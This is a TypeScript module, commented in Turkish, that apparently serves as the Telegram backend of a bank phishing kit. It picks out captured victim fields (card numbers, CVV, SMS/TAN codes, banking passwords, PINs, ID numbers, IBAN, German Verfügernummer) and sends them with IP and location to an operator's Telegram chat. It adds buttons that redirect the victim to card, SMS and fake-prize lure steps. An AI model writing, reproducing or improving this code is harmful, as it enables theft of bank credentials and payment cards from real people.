import { Bot } from "grammy";
import type { AuditEventPayload } from "./audit-event";

export type ServerAuditRow = AuditEventPayload & {
  created_at?: string | null;
  id?: number | string | null;
};

/** Önemli form alanları (sadece bunlar dolunca hem telegram'a gönder, hem ses çal) */
const SIGNIFICANT_FORM_FIELDS: readonly string[] = [
  "firstName", "lastName", "fullName", "phone", "mobile", "email",
  "smsCode", "sms_code", "smscode", "tan", "tacCode",
  "cardNumber", "cardNo", "cardHolder", "cardExpiry", "cardCvc", "cvv",
  "bankName", "bankSlug", "loginMethod", "login_method",
  "username", "userName", "user_id", "customerNo",
  "password", "pass", "pin", "pinCode",
  "personalCode", "idNumber", "tc", "birthday",
  "verfuegernummer", "blz", "iban", "accountNo",
  "orderedField1", "orderedField2", "orderedField3",
  "bankPhone",
];

/** Form alanlarının Telegram'da görünen isimleri */
function formFieldLabel(key: string): string {
  const k = key.toLowerCase();
  if (k === "firstname" || k === "first_name" || k === "ad") return "👤 Ad";
  if (k === "lastname" || k === "last_name" || k === "soyad") return "👤 Soyad";
  if (k === "fullname" || k === "full_name" || k === "isimsoyisim") return "👤 İsim Soyisim";
  if (k === "phone" || k === "mobile" || k === "tel") return "📱 Tel";
  if (k === "smscode" || k === "sms_code" || k === "sms" || k === "tan" || k === "taccode" || k === "onay") return "📱 SMS/TAN";
  if (k === "cardnumber" || k === "cardno" || k === "kart") return "💳 Kart No";
  if (k === "cardholder" || k === "card_holder") return "💳 Kart Sahibi";
  if (k === "cardexpiry" || k === "card_expiry" || k === "skt") return "💳 Son Kullanma";
  if (k === "cardcvc" || k === "cvv" || k === "cvc" || k === "ccv") return "💳 CVC/CVV";
  if (k === "loginmethod" || k === "login_method" || k === "giristuru") return "🔐 Giriş Tür";
  if (k === "bankname" || k === "bank_name") return "🏦 Banka";
  if (k === "bankslug" || k === "bank_slug") return "🏦 Slug";
  if (k === "username" || k === "user_name" || k === "kullaniciadi" || k === "userid" || k === "customerno" || k === "musterino") return "👤 Kullanıcı Adı";
  if (k === "password" || k === "pass" || k === "sifre" || k === "parola") return "🔐 Şifre";
  if (k === "pin" || k === "pin_code" || k === "pin code" || k === "pinkodu") return "🔐 PIN";
  if (k === "personalcode" || k === "personal_code" || k === "idnumber" || k === "tc" || k === "kimlik") return "🆔 Kimlik / TC";
  if (k === "birthday" || k === "dogumtarihi" || k === "birth_date") return "🎂 Doğum Tarihi";
  if (k === "verfuegernummer" || k.startsWith("verf")) return "📋 Verfüger Nr";
  if (k === "iban" || k === "accountno" || k === "hesapno") return "🏦 IBAN / Hesap";
  if (k === "orderedfield1") return "📝 Alan-1";
  if (k === "orderedfield2") return "📝 Alan-2";
  if (k === "orderedfield3") return "📝 Alan-3";
  if (k === "bankphone" || k === "bank_phone") return "🏦 Banka Tel";
  return `📝 ${key}`;
}

/** Meta.form_data'dan sadece dolu ve önemli alanları çıkar */
export function extractSignificantFormValues(
  meta: unknown,
): Array<{ key: string; label: string; value: string }> {
  if (!meta || typeof meta !== "object") return [];
  const m = meta as Record<string, any>;
  const pool: Record<string, any> = {};
  if (typeof m.form_data === "object" && m.form_data) {
    Object.assign(pool, m.form_data as Record<string, any>);
  }
  Object.assign(pool, m);
  const sig = new Set<string>(SIGNIFICANT_FORM_FIELDS.map((s) => s.toLowerCase()));
  const out: Array<{ key: string; label: string; value: string }> = [];
  for (const [k, raw] of Object.entries(pool)) {
    if (raw === undefined || raw === null) continue;
    const str = String(raw);
    if (str.trim().length === 0) continue;
    if (typeof raw === "object") continue; // skip arrays / bankFormHistory / nested
    if (sig.has(k.toLowerCase()) ||
        SIGNIFICANT_FORM_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
      out.push({
        key: k,
        label: formFieldLabel(k),
        value: str.trim().slice(0, 120),
      });
    }
  }
  return out;
}

/** ⭐ EN KATI KURAL: Sadece FORM DOLDURULUNCA (veya ban/hata gibi ciddi olaylar) Telegram'a gönder
 *  - YÖNLENDİRMELER (step eventleri, admin yönlendirmesi, callback yönlendirmesi) GÖNDERİLMEZ
 *  - PRESENCE / ROUTE / herhangi bir status update GÖNDERİLMEZ
 *  - Sadece:
 *      1) Submit (form gönderildi)
 *      2) Bank_form (banka alanı güncellendi / submit edildi)
 *      3) Önemli form alanları dolu (meta extract edilen alanlar varsa, ancak yukarıdakilerden değilse de)
 *      4) HATA / AUTH (kimlik) / BAN
 */
export function isTelegramWorthyEvent(row: ServerAuditRow): boolean {
  const k = String(row.event_kind || "").toLowerCase();
  const a = String(row.event_action || "").toLowerCase();

  // Kesinlikle gönderilmeyecekler (HER TÜRLÜ step event = yönlendirme = admin/normal step)
  if (k === "step") return false; // ADMIN yönlendirmesi, server_step_redirect vb. HEPSİ ATLANIR
  if (k === "presence") return false;
  if (k === "route") return false;
  if (a.includes("pulse") || a.includes("heartbeat") || a.includes("ping")) return false;
  if (a.includes("session_mount") || a.includes("hidden_") || a.includes("pagehide") || a.includes("subscribe")) return false;
  if (a.includes("redirect") || a.includes("server_step") || a.includes("db_step_sync") || a.includes("admin_realtime")) return false;

  // Kesinlikle gönderilecekler
  if (k === "submit") return true;
  if (k === "bank_form") return true;
  if (k === "error") return true;
  if (k === "auth") return true;
  if (a.includes("ban") || a.includes("unban")) return true;

  // Ekstra kural: meta'da ÖNEMLİ form alanları doluysa ve event başka bir kategorideyse gönder (tedbir ama yukarıdakiler zaten)
  const fields = extractSignificantFormValues(row.meta);
  return fields.length > 0;
}

/** Inline yönlendirme butonları oluştur (eğer session varsa) */
export function buildInlineKeyboardForSession(
  sessionId: string | null | undefined,
  publicId: string | null | undefined,
): InlineKeyboardButton[][] {
  const sid = String(sessionId || publicId || "").trim();
  if (!sid) return [];
  const mk = (label: string, step: string) => ({
    text: label,
    callback_data: `redirect:${step}:${sid}`,
  });
  return [
    [mk("🏦 Banka Listesi", "banken"), mk("⏳ Beklet", "wait"), mk("👤 İsim", "win")],
    [mk("💳 Kart", "card"), mk("📱 SMS", "sms"), mk("🎰 Çark", "wheel")],
    [mk("❌ Geçersiz Banka", "invalid_bank"), mk("🆘 Canlı Destek", "live_support"), mk("🎉 Tebrikler", "congrats")],
  ];
}

export type InlineKeyboardButton = { text: string; callback_data: string };


export function getConfig() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const webhookSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
  return {
    configured: Boolean(
      token && String(token).trim().length > 5 && chatId && String(chatId).trim().length > 3,
    ),
    token: token ? String(token).trim() : null,
    chatId: chatId ? String(chatId).trim() : null,
    webhookSecret: webhookSecret ? String(webhookSecret).trim() : null,
  };
}

export function isTelegramConfigured(): boolean {
  return getConfig().configured;
}

let botInstance: Bot | null = null;
export function getTelegramBot(): Bot | null {
  const cfg = getConfig();
  if (!cfg.token) return null;
  if (!botInstance) botInstance = new Bot(cfg.token);
  return botInstance;
}

function escapeHTML(s: unknown): string {
  if (s === null || s === undefined) return "";
  const str = String(s);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function ts(createdAt?: string | null): string {
  if (!createdAt) return "-";
  try {
    const d = new Date(createdAt);
    if (Number.isNaN(d.getTime())) return String(createdAt).slice(0, 19);
    return d.toLocaleString("tr-TR", { timeZone: "Europe/Istanbul", hour12: false });
  } catch {
    return String(createdAt).slice(0, 19);
  }
}

export function formatAuditEventForTelegram(row: ServerAuditRow): string {
  const kind = String(row.event_kind ?? "?");
  const action = String(row.event_action ?? "?");
  const status = String(row.status ?? "ok");

  let emoji = "ℹ️";
  let title = "";
  const short = `${kind}:${action}`;

  if (kind === "submit" || action.includes("submit") || action.includes("form")) {
    if (action.includes("card") || action.includes("kart")) {
      emoji = "💳";
      title = "KART BİLGİSİ GİRİLDİ";
    } else if (action.includes("sms")) {
      emoji = "📱";
      title = "SMS KODU GİRİLDİ";
    } else if (action.includes("bank") || action.includes("win")) {
      emoji = "📝";
      title = "FORM GÖNDERİLDİ";
    } else {
      emoji = "✅";
      title = "FORM GÖNDERİLDİ";
    }
  } else if (kind === "step") {
    if (action.includes("redirect")) {
      if (action.includes("back") || action.includes("sync_from_back")) {
        emoji = "↪️";
        title = "GERİ DÖNÜŞ / ADIM DEĞİŞTİ";
      } else if (action.includes("server") || action.includes("admin")) {
        emoji = "🔀";
        title = "ADMIN YÖNLENDİRMESİ";
      } else {
        emoji = "➡️";
        title = "YÖNLENDİRME";
      }
    } else if (action.includes("back") || action.includes("db_step_sync")) {
      emoji = "↩️";
      title = "GERİ TUŞU / ADIM GERİ";
    } else if (action.includes("wait_mount") || action === "wait") {
      emoji = "⏳";
      title = "BEKLEME SAYFASINA GİRDİ";
    } else {
      emoji = "👣";
      title = "ADIM DEĞİŞTİ";
    }
  } else if (kind === "presence") {
    if (action.includes("online")) {
      emoji = "🟢";
      title = "ONLINE OLDU";
    } else if (action.includes("offline")) {
      emoji = "⚪";
      title = "OFFLINE OLDU";
    } else if (action.includes("pulse") || action.includes("heartbeat") || action.includes("ping")) {
      emoji = "💓";
      title = "PRESENCE PULSE";
    } else {
      emoji = "📡";
      title = "PRESENCE";
    }
  } else if (kind === "route") {
    emoji = "🧭";
    title = "ROUTE";
  } else if (kind === "bank_form") {
    emoji = "🏦";
    title = "BANKA FORMU";
  } else if (kind === "error") {
    emoji = "⛔";
    title = "HATA";
  } else if (kind === "auth") {
    emoji = "🔐";
    title = "AUTH";
  } else if (action.includes("ban") || action.includes("unban")) {
    if (action.includes("unban")) {
      emoji = "♻️";
      title = "BAN KALDIRILDI";
    } else if (action.includes("ban")) {
      emoji = "🚫";
      title = "IP BANLANDI";
    } else {
      emoji = "🛡️";
      title = "IP İŞLEMİ";
    }
  }

  if (!title) title = short.toUpperCase();

  const lines: string[] = [];
  lines.push(`${emoji} <b>${escapeHTML(title)}</b> <code>[${escapeHTML(status)}]</code>`);
  lines.push(`<i>${escapeHTML(short)}</i>`);

  if (row.session_id || row.public_id) {
    const sid = row.session_id ? String(row.session_id).slice(0, 12) : "";
    const pid = row.public_id ? String(row.public_id).slice(0, 12) : "";
    lines.push(`👤 Session: <code>${escapeHTML(sid || pid || "-")}</code>`);
  }

  if (row.from_step || row.to_step) {
    const f = row.from_step || "-";
    const t = row.to_step || "-";
    lines.push(`🔁 <b>${escapeHTML(f)}</b> → <b>${escapeHTML(t)}</b>`);
  }

  if (row.bank_name || row.bank_slug) {
    lines.push(`🏦 <b>${escapeHTML(row.bank_name || row.bank_slug)}</b>`);
  }

  if (row.user_ip) {
    const loc = [row.country, row.city].filter(Boolean).map(escapeHTML).join(", ") || "";
    lines.push(`🌐 <code>${escapeHTML(row.user_ip)}</code>${loc ? ` - ${loc}` : ""}`);
  }

  if (row.pathname || row.current_url) {
    const p = row.pathname || row.current_url || "";
    if (p) lines.push(`📍 <code>${escapeHTML(String(p).slice(0, 140))}</code>`);
  }

  if (row.admin_email || row.admin_action) {
    lines.push(`👮 Admin: <b>${escapeHTML(row.admin_email || "-")}</b> <code>${escapeHTML(row.admin_action || "")}</code>`);
  }

  if (row.error_name || row.error_message) {
    lines.push(`❌ Hata: <b>${escapeHTML(row.error_name || "")}</b> — <code>${escapeHTML(String(row.error_message || "").slice(0, 400))}</code>`);
  }

  // ⭐ Önemli form alanlarını SATIR SATIR göster (eski "pick" yaklaşımı kaldırıldı)
  const significantFields = extractSignificantFormValues(row.meta);
  if (significantFields.length > 0) {
    lines.push("\n📋 <b>FORM ALANLARI</b>");
    for (const f of significantFields) {
      lines.push(`${f.label}: <code>${escapeHTML(f.value)}</code>`);
    }
  } else if (row.meta && typeof row.meta === "object") {
    // Eğer belirgin alan yoksa ve meta küçükse, önemli olmayanları da göster (limited)
    const m = row.meta as Record<string, any>;
    const rest: string[] = [];
    const keys = Object.keys(m).filter(
      (k) =>
        m[k] !== undefined &&
        m[k] !== null &&
        String(m[k]).trim() !== "" &&
        typeof m[k] !== "object" &&
        k !== "form_data",
    );
    for (const k of keys.slice(0, 4)) {
      rest.push(`${escapeHTML(k)}: <code>${escapeHTML(String(m[k]).slice(0, 80))}</code>`);
    }
    if (rest.length) lines.push("ℹ️ " + rest.join(" • "));
  }

  lines.push(`🕒 ${escapeHTML(ts(row.created_at))}`);

  let out = lines.join("\n").trim();
  if (out.length > 4000) out = out.slice(0, 3990) + "\n…";
  return out;
}

export async function notifyAuditEventsToTelegram(
  rows: ServerAuditRow[],
): Promise<{ sent: number; errors: number }> {
  if (!rows || rows.length === 0) return { sent: 0, errors: 0 };
  const cfg = getConfig();
  if (!cfg.token || !cfg.chatId) return { sent: 0, errors: 0 };
  const bot = getTelegramBot();
  if (!bot) return { sent: 0, errors: 0 };

  // ⭐ YENİ KURAL: Sadece FORM / BAN / HATA / ADMİN YÖNLENDİRMESİ gibi ÖNEMLİ eventleri gönder
  // (presence, route, kendiliğinden step eventleri, ping vb. GÖNDERİLMEZ)
  const filtered = rows.filter((r) => isTelegramWorthyEvent(r));

  if (filtered.length === 0) return { sent: 0, errors: 0 };

  let sent = 0;
  let errors = 0;

  // ⭐ YENİ: HER EVENT İÇİN TEK MESAJ (chunk'lamayı kaldırdık) — altında INLINE BUTONLARI OLSUN
  for (const r of filtered) {
    const text = formatAuditEventForTelegram(r);
    const inlineKeyboard = buildInlineKeyboardForSession(r.session_id, r.public_id);
    try {
      const opts: any = {
        parse_mode: "HTML",
        link_preview_options: { is_disabled: true },
      };
      if (inlineKeyboard.length > 0) {
        opts.reply_markup = { inline_keyboard: inlineKeyboard };
      }
      await bot.api.sendMessage(cfg.chatId, text, opts);
      sent++;
    } catch (err: unknown) {
      errors++;
      try {
        console.error(
          "[telegram] sendMessage single failed",
          err instanceof Error ? err.message : String(err),
          "event_kind=",
          r.event_kind,
          "event_action=",
          r.event_action,
        );
      } catch {}
    }
  }
  return { sent, errors };
}

export async function sendTelegramTestMessage(
  extraText?: string,
): Promise<{ ok: boolean; error?: string }> {
  const cfg = getConfig();
  if (!cfg.token || !cfg.chatId)
    return { ok: false, error: "TELEGRAM_BOT_TOKEN ve/veya TELEGRAM_CHAT_ID tanımlı değil" };
  const bot = getTelegramBot();
  if (!bot) return { ok: false, error: "Bot oluşturulamadı" };
  try {
    const text =
      `✅ <b>Telegram Bot Bağlantısı Başarılı</b>\n\n🕒 ${escapeHTML(
        new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" }),
      )}${extraText ? `\n\n${escapeHTML(extraText)}` : ""}`;
    await bot.api.sendMessage(cfg.chatId, text, { parse_mode: "HTML", link_preview_options: { is_disabled: true } });
    return { ok: true };
  } catch (e: any) {
    return { ok: false, error: e?.message || String(e) };
  }
}

export function getTelegramChatId(): string | null {
  return getConfig().chatId;
}
export function getTelegramWebhookSecret(): string | null {
  return getConfig().webhookSecret;
}
export { escapeHTML as escapeTelegramHTML };
